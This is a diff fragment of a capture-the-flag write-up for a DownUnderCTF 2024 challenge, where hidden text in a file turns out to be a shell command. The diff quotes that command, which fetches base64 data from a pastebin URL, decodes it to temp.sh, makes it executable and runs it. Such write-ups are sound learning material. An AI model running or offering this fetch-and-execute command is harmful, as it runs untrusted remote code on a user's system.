@@ -18,11 +18,11 @@ I thought I was being 1337 by asking AI to help me solve challenges,
 i open file and find a unreadable text inside it
 <img src=" https://cybersecctf.github.io/blog/2024/downunderctf2024/tldrpleasesummarise/curllocation.png" alt="ctf quetion image" class="inline"/>
 
-so get it by string and find command
+so get it by string temp.sh because run of this is possible  
 
 <code>curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d > temp.sh && chmod +x temp.sh && ./temp.sh</code>
 
-and search DUCTF  inside it and find it
+and search DUCTF  inside command output  and find flag with this code
 
 <pre>
 #python
